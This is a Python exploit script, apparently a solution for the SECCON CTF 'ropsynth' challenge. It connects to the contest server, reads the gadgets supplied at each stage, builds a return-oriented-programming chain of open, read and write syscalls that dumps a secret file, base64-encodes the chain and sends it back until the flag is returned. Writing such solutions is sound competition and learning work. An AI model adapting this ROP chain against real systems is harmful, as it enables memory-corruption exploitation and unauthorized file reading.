#!/usr/bin/env python
import binascii
import base64
import sys
import socket

from util import *
from rop import *

#from IPython import embed
#from IPython.config import Config
# use this for debugging
# embed(config=ipyc)

# Dont ask for y/n
#ipyc = Config()
#ipyc.TerminalInteractiveShell.confirm_exit = False

######################

sock = socket.socket()
sock.connect(("ropsynth.pwn.seccon.jp", 10000))
sock.setblocking(False)

stage = 1

while True:
    # eat stage string
    recvline(sock)
    print "=============[stage %d]============" % stage

    gadgets = recvline(sock)

    rop = Ropperator(global_kb, gadgets.strip())

    # Low level ROP primitives
    def load_arg1(val):
        ret = rop.rop('POP_RAX', val)
        ret += rop.rop('PUSH_RAX_POP_RDI')
        return ret

    def load_arg2(val):
        ret = rop.rop('POP_RSI', val)
        return ret

    def load_arg3(val):
        ret = rop.rop('POP_RAX', val)
        ret += rop.rop('PUSH_RAX_POP_RDX')
        return ret

    def save_return_to_arg1():
        return rop.rop('PUSH_RAX_POP_RDI')

    def save_return_to_arg3():
        return rop.rop('PUSH_RAX_POP_RDX')

    def syscall(num):
        ret = rop.rop('POP_RAX', num)
        ret += rop.rop('SYSCALL')
        return ret

    # ROP Function calls
    def sys_open(filename, oflag, mode):
        ret = ""
        ret += load_arg1(filename)
        ret += load_arg2(oflag)
        ret += load_arg3(mode)
        ret += syscall(2) # sys_open
        ret += save_return_to_arg1()

        return ret

    def sys_read(buf, size):
        ret = ""
        # arg1 loaded from open
        ret += load_arg2(buf)
        ret += load_arg3(size)
        ret += syscall(0) # sys_read
        ret += save_return_to_arg3()

        return ret

    def sys_write(fd, buf):
        ret = ""
        ret += load_arg1(fd)
        ret += load_arg2(buf)
        # arg3 loaded from read
        ret += syscall(1) # sys_write

        return ret

    # Challenge constants from launcher.c
    GADGETS_BASE = 0x00800000
    FILENAME_ADDR = 0x00a00000
    SCRATCH_ADDR = FILENAME_ADDR + 0x100

    rop.base_address = GADGETS_BASE

    ret = rop.load_gadgets()

    if not ret:
        print("Failed to load gadgets...")
        sys.exit(0)

    ret = rop.determine_guards()

    if not ret:
        print("Failed to determine guards...")
        sys.exit(0)

    """
    # open secret file, read, and print to stdout
    # ROP chain isn't exactly this code, but it's similar
    # ABI: RDI, RSI, RDX, RCX, R8, R9

    pop rax # open = 2
    pop rdi # address of "secret"
    pop rsi # 0
    pop rdx # 0
    syscall

    # rax now fd
    push rax
    pop rdi # arg1 = fd
    pop rax # read = 0
    pop rsi # pointer to some buffer
    pop rdx # 0x100
    syscall

    # rax now len
    push rax
    pop rdx # arg3 = len
    pop rax # write = 1
    pop rdi # stdout = 1
    pop rsi # pointer to some buffer
    syscall
    """

    ropchain = ""
    ropchain += sys_open(FILENAME_ADDR, 0, 0)
    ropchain += sys_read(SCRATCH_ADDR, 256)
    ropchain += sys_write(1, SCRATCH_ADDR)

    print("Ropchain built: %d bytes" % (len(ropchain)))

    # Encode the string for sending
    # Also, socat is a jerk with strange inputs, so this is safer
    ropchain = binascii.b2a_base64(ropchain).strip()

    # Fire the ropchain
    sock.send(ropchain + "\n")

    # ropchain successful?
    answer = recvline(sock).strip()

    if answer == "OK":
        print("Stage %d passed!" % stage)
        stage += 1

        # print the flag
        if stage >= 6:
            print "FLAG: %s" % recvline(sock)
            sock.close()
            break
    else:
        print("Failed to pass stage %d" % (stage))
        sys.exit(0)
